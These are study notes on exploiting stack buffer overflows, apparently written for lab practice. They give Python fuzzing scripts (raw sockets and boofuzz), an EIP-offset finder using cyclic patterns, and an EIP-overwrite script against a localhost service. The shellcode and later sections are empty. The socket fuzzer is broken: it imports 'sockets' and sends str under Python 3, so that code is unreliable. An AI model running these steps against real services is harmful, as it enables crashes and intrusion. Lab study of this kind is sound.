# Buffer overflows

## Spiking

I'm not so sure what's the difference between spiking and fuzzing. But still included it here for completeness sake.

```text
generic_send_tcp
```

## Fuzzing

### Sockets

This is most basic way of fuzzing.

```python
#!/usr/bin/env python3
import sys, sockets
from time import sleep

buffer = "1" * 64
RHOST = "127.0.0.1"
RPORT = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST,RPORT))
    
        s.send("change_me " + buffer)
        s.close()
        sleep(1)
        buffer = buffer + "1"*64
    except:
        print("Crashed at buffer length of: " + str(len(buffer)))
```

### Boofuzz

We can use boofuzz. This python module will do a lot of work for us and also create a database of results.

```python
#!/usr/bin/env python3
from boofuzz import *

RHOST = "127.0.0.1"
RPORT = 9999

s = Session(target=Target(connection=SocketConnection(RHOST,RPORT,proto="tcp")))

s_initialize("FUZZER")

s_string("change_me", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("fuzzme")

s.connect(s_get("FUZZER"))
s.fuzz()
```

## Finding offset of EIP

Best way to find EIP is to send a non-repeating pattern of characters.

```python
#!/usr/bin/env python3
from pwn import *

RHOST = "127.0.0.1"
RPORT = 9999

# pwn cyclic 4000
# OR msf-pattern_create -l 4000
cyclic_pattern = b"..."

s = remote(RHOST,RPORT)

payload = b"".join([
    b"change_me ",
    cyclic_pattern
])

s.send(payload)
s.interactive()
```

## Overwriting EIP

Now we can try fill EIP with four 2's \(0x32323232\).

```python
#!/usr/bin/env python3
from pwn import *

RHOST = "127.0.0.1"
RPORT = 9999

offset = 2014

s = remote(RHOST,RPORT)

payload = b"".join([
    b"change_me ",
    b"1"*2014,
    b"2"*4
])

s.send(payload)
s.interactive()
```

## Finding bad characters

## Finding right module

## Generating shellcode

## Root

